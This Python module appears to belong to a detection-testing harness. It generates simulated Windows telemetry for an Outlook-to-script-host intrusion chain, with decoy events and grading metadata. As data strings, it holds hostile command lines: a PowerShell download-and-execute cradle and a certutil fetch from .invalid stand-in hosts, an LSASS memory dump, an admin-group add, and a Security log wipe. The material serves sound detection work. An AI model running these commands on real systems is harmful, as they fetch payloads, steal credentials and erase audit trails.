"""storyline_outlook_script_backdoor -- a mail-borne script: Outlook starts a Windows Script Host, whose
PowerShell reads LSASS, creates and deletes a throw-away account, adds the stolen account to a local
administrators group, starts an implant that beacons out, and clears the Security log. The process side is a
SPAWN CHAIN: every alert-raising process is created by the previous stage's alert-raising process.

Registered by ``scenario_registry._discover`` (module name ``storyline_*``, exports ``STORYLINE``).

    lolbin_shell -> ps_encoded -> {tool_download, lsass_read, stage2_shell}
                                   stage2_shell -> {service_persistence, sched_task, group_add, log_clear}
    (plus ps_cradle (4104), ephemeral_account (4720 + 4726) and c2_beacon (EID 3): alerts without a parent key)

WHY IT EXISTS (ADR-011 n gap, ADR-012 WP 7). The account-manipulation shape of the keyed family: the Windows-log
steps ``ephemeral_account`` (4720 then 4726 on one target: ``common_rapid_account_lifecycle``) and the
``group_add`` step (``net localgroup Administrators /add`` creation record plus the 4732: ``common_priv_grant``).
The builder marks each step's alert-raising record (``trigger=True``); the oracle's ``causal_links`` are derived
from the raw records by ``sysmon_tree.derive_links`` (B's trigger EID 1 has ParentProcessGuid == A's trigger
ProcessGuid; nothing else is graded). A second-stage PowerShell is both a child (of the first PowerShell) and a
parent of four alerting children.

PROCESS TREE (one workstation; ``[rule]`` = a step's trigger and raises an alert)

    explorer -> OUTLOOK -> wscript [office-spawn]                              (step lolbin_shell)
                             +--> powershell -enc [encoded-cmd] = P            (step ps_encoded)
                                    +--> recon children                        (helpers of ps_cradle)
                                    +--> certutil -urlcache [certutil]         (step tool_download)
                                    +--> dumper --EID10--> lsass [lsass-dump]  (step lsass_read)
                                    +--> powershell -enc stage 2 [encoded-cmd] = Q   (step stage2_shell)
                                           +--> sc.exe create [service]               (step service_persistence)
                                           +--> implant --EID3 x N--> C2              (step c2_beacon, not linkable)
                                           +--> schtasks /create [schtasks]           (step sched_task)
                                           +--> net localgroup Administrators /add [local-account] (step group_add)
                                           +--> wevtutil cl Security [log-clear]      (step log_clear)

    8 trigger-to-trigger spawn links.

TELEMETRY. Real parsers: ``sysmon`` (EID 1, 3, 10) and ``windows_eventlog`` (4104, 4720, 4726, 4732,
1102). No dependency gaps (``parse_expected=True`` everywhere).

STRUCTURE VARIES WITH THE SEED: account, workstation, address, throw-away account name, script-block
count (1-3), beacon count (20-23), the C2 address and the dropped tool names.

SAFETY. Simulation only: ``.invalid`` names, documentation / private addresses, a fixed calendar epoch.
"""
from __future__ import annotations

import sys
from pathlib import Path
from random import Random

TWIN = Path(__file__).resolve().parent
if str(TWIN) not in sys.path:
    sys.path.insert(0, str(TWIN))

from scenario import ChainStepSpec, ScenarioDef  # noqa: E402
from scenario_kit import BASE_MS  # noqa: E402
from sysmon_tree import Emitter, Host  # noqa: E402

TAG = "osb"

STEPS: tuple[ChainStepSpec, ...] = (
    ChainStepSpec("lolbin_shell", "sysmon", True,
                  "Outlook starts a Windows Script Host (a document host spawns a script host)"),
    ChainStepSpec("ps_encoded", "sysmon", True,
                  "the script host starts a PowerShell with an encoded command"),
    ChainStepSpec("ps_cradle", "windows_eventlog", True,
                  "the script host's PowerShell logs a download-and-execute cradle"),
    ChainStepSpec("tool_download", "sysmon", True,
                  "the PowerShell fetches the next-stage tool with certutil"),
    ChainStepSpec("lsass_read", "sysmon", True,
                  "a dumper started by that PowerShell opens lsass.exe with a memory-read mask"),
    ChainStepSpec("ephemeral_account", "windows_eventlog", True,
                  "a local account is created and deleted again within minutes"),
    ChainStepSpec("stage2_shell", "sysmon", True,
                  "the first PowerShell starts a second-stage PowerShell with an encoded command"),
    ChainStepSpec("service_persistence", "sysmon", True,
                  "the second stage creates a service for the implant (sc.exe create)"),
    ChainStepSpec("sched_task", "sysmon", True,
                  "the second stage registers a scheduled task for the implant"),
    ChainStepSpec("group_add", "sysmon", True,
                  "the stolen account is added to the local Administrators group (net localgroup, then Event 4732)"),
    ChainStepSpec("c2_beacon", "sysmon", True,
                  "the implant started by the second stage makes regular-interval outbound connections"),
    ChainStepSpec("log_clear", "sysmon", True,
                  "the second stage clears the Security event log (wevtutil cl, then Event 1102)"),
)
DECOY_STEPS: tuple[ChainStepSpec, ...] = (
    ChainStepSpec("decoy_account_churn", "windows_eventlog", True,
                  "a helpdesk administrator adds a new hire to a local group on a file server (BENIGN)"),
)

_ACCOUNTS = ("d.sales", "w.support", "y.planning", "z.ops")
_WKS = ("wks-sal-33", "wks-sup-11", "wks-pln-05", "wks-ops-41")
_TOOLS = ("lsadump.exe", "mdmpx.exe", "wcdump.exe")
_IMPLANTS = ("OneDriveSync.exe", "chromeupd.exe", "teamsagent.exe")
_C2 = ("203.0.113.88", "198.51.100.9", "203.0.113.150")
_CRADLE = "powershell -nop -w hidden -c IEX ((New-Object Net.WebClient).DownloadString('http://x.example.invalid/p'))"
_ENC1 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA"
_ENC2 = "JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtAA=="
_PS_CHANNEL = "Microsoft-Windows-PowerShell/Operational"
_SYS = "C:\\Windows\\System32\\"
_PS = _SYS + "WindowsPowerShell\\v1.0\\powershell.exe"
_OFFICE = "C:\\Program Files\\Microsoft Office\\root\\Office16\\"


def build(seed: int):
    rng = Random(seed * 1299791 + 79)
    user = rng.choice(_ACCOUNTS)
    wks_name = rng.choice(_WKS)
    ip = f"10.47.{rng.randint(1, 9)}.{rng.randint(20, 200)}"
    tool = rng.choice(_TOOLS)
    implant_name = rng.choice(_IMPLANTS)
    c2 = rng.choice(_C2)
    ghost = f"svc-{rng.randint(1000, 9999)}"
    n_ps = 1 + seed % 3
    n_beats = 20 + seed % 4
    svc_name = f"OneSync{rng.randint(10, 99)}"
    implant_path = f"C:\\Users\\Public\\{implant_name}"

    wks = Host(wks_name, ip, seed)
    em = Emitter(seed, TAG, STEPS)
    notes: dict = {}

    def add(label: str, source_type: str, raw: dict, ts: int, trigger: bool = False) -> None:
        em.add(label, source_type, raw, ts, ip, trigger=trigger)

    def spawn(label: str, p, trigger: bool = True) -> None:
        add(label, "sysmon", p.create_record(), p.start_ms, trigger)

    t0 = BASE_MS
    explorer = wks.proc("C:\\Windows\\explorer.exe", "explorer.exe", user, t0 - 1_000)
    outlook = wks.proc(_OFFICE + "OUTLOOK.EXE", "\"OUTLOOK.EXE\"", user, t0, explorer)
    wscript = wks.proc(_SYS + "wscript.exe", "wscript.exe C:\\Users\\Public\\invoice.js", user, t0 + 5_000, outlook)
    ps = wks.proc(_PS, f"powershell.exe -nop -w hidden -enc {_ENC1}", user, t0 + 11_000, wscript)
    recon = [wks.proc(_SYS + exe, c, user, t0 + 16_000 + i * 1_000, ps) for i, (exe, c) in enumerate((
        ("whoami.exe", "whoami /priv"), ("hostname.exe", "hostname"), ("net.exe", "net localgroup administrators")))]
    t_ps = t0 + 25_000
    certutil = wks.proc(_SYS + "certutil.exe",
                        f"certutil.exe -urlcache -split -f http://stage.example.invalid/{implant_name} {implant_path}",
                        user, t0 + 40_000, ps)
    dumper = wks.proc(f"C:\\Users\\Public\\{tool}", f"{tool} -ma lsass.exe", user, t0 + 60_000, ps)
    lsass = wks.proc(_SYS + "lsass.exe", "lsass.exe", "SYSTEM", t0 - 7_200_000)
    stage2 = wks.proc(_PS, f"powershell.exe -nop -w hidden -enc {_ENC2}", user, t0 + 200_000, ps)
    sc = wks.proc(_SYS + "sc.exe", f"sc.exe create {svc_name} binPath= {implant_path}", user, t0 + 230_000, stage2)
    implant = wks.proc(implant_path, implant_name, user, t0 + 300_000, stage2)
    schtask = wks.proc(_SYS + "schtasks.exe",
                       f"schtasks.exe /create /tn {svc_name} /tr {implant_path} /sc onlogon", user, t0 + 260_000, stage2)
    net_grp = wks.proc(_SYS + "net.exe", f"net.exe localgroup Administrators {user} /add", user, t0 + 280_000, stage2)
    wevt = wks.proc(_SYS + "wevtutil.exe", "wevtutil.exe cl Security", user, t0 + 700_000, stage2)

    for p in (explorer, outlook):
        spawn("lolbin_shell", p, trigger=False)
    spawn("lolbin_shell", wscript)
    notes["lolbin_shell"] = f"{user} on {wks_name}: OUTLOOK -> wscript.exe"

    spawn("ps_encoded", ps)
    notes["ps_encoded"] = f"wscript.exe starts powershell.exe -enc on {wks_name}"

    for p in recon:
        spawn("ps_cradle", p, trigger=False)
    for i in range(n_ps):
        ts = t_ps + i * 10_000
        add("ps_cradle", "windows_eventlog",
            {"EventID": 4104, "Channel": _PS_CHANNEL, "ProviderName": "Microsoft-Windows-PowerShell",
             "Computer": wks_name, "SubjectUserName": user, "SubjectDomainName": "CORP",
             "ScriptBlockText": _CRADLE, "TimeCreated": ts}, ts)
    notes["ps_cradle"] = f"{n_ps} script-block event(s) on {wks_name}"

    spawn("tool_download", certutil)
    notes["tool_download"] = f"certutil -urlcache fetches {implant_name}"

    spawn("lsass_read", dumper)
    t_acc = dumper.start_ms + 5_000
    add("lsass_read", "sysmon", dumper.access_record(t_acc, lsass.image, lsass.guid, lsass.pid, "0x1010"), t_acc)
    notes["lsass_read"] = f"{tool} opens lsass.exe with GrantedAccess 0x1010"

    t_new = t0 + 100_000
    t_del = t_new + 50_000
    for eid, ts in ((4720, t_new), (4726, t_del)):
        add("ephemeral_account", "windows_eventlog",
            {"EventID": eid, "Computer": wks_name, "SubjectUserName": user, "SubjectDomainName": "CORP",
             "TargetUserName": ghost, "TargetDomainName": wks_name, "TimeCreated": ts}, ts)
    notes["ephemeral_account"] = f"{user} creates then deletes {ghost} on {wks_name}"

    spawn("stage2_shell", stage2)
    notes["stage2_shell"] = f"second-stage powershell.exe -enc on {wks_name}"
    spawn("service_persistence", sc)
    notes["service_persistence"] = f"sc.exe create {svc_name} -> {implant_path}"
    spawn("sched_task", schtask)
    notes["sched_task"] = f"schtasks /create {svc_name} -> {implant_name} at logon"

    spawn("group_add", net_grp)
    t_grp = net_grp.start_ms + 4_000
    add("group_add", "windows_eventlog",
        {"EventID": 4732, "Computer": wks_name, "SubjectUserName": user, "SubjectDomainName": "CORP",
         "TargetUserName": "Administrators", "TargetDomainName": wks_name, "MemberName": user,
         "TimeCreated": t_grp}, t_grp)
    notes["group_add"] = f"{user} added to Administrators on {wks_name}"

    spawn("c2_beacon", implant, trigger=False)
    t_b = implant.start_ms + 30_000
    for i in range(n_beats):
        ts = t_b + i * 15_000 + (rng.randint(-500, 500) if i else 0)
        add("c2_beacon", "sysmon", implant.connect_record(ts, c2, 443, 49_400 + i), ts, trigger=(i == 19))
    notes["c2_beacon"] = f"{n_beats} connections from {implant_name} to {c2}:443"

    spawn("log_clear", wevt)
    t_clr = wevt.start_ms + 3_000
    add("log_clear", "windows_eventlog",
        {"EventID": 1102, "Channel": "Security", "ProviderName": "Microsoft-Windows-Eventlog",
         "Computer": wks_name, "SubjectUserName": user, "SubjectDomainName": "CORP",
         "TimeCreated": t_clr}, t_clr)
    notes["log_clear"] = f"{user} clears the Security log on {wks_name}"
    return em.payloads, {}, notes, None


def _build_decoys(seed: int) -> list:
    spec = DECOY_STEPS[0]
    em = Emitter(seed, TAG + "d", DECOY_STEPS)
    ts = BASE_MS + 50_000
    em.add(spec.label, "windows_eventlog",
           {"EventID": 4732, "Computer": "fs04", "SubjectUserName": "helpdesk.adm", "SubjectDomainName": "CORP",
            "TargetUserName": "Remote Desktop Users", "TargetDomainName": "FS04", "MemberName": "n.newhire",
            "TimeCreated": ts}, ts, "10.48.0.6")
    return em.payloads


STORYLINE = ScenarioDef(
    name="outlook_script_backdoor",
    steps=STEPS,
    build=build,
    oracle_path=TWIN / "oracle_outlook_script_backdoor.yaml",
    summary="Outlook -> wscript -> PowerShell on one workstation as a spawn chain (Sysmon process tree): encoded "
            "command, certutil download, LSASS dump, throw-away account, a second-stage PowerShell that creates the "
            "service, scheduled task and local-admin add, implant beacon, Security log cleared",
    decoy=_build_decoys,
    decoy_steps=DECOY_STEPS,
)
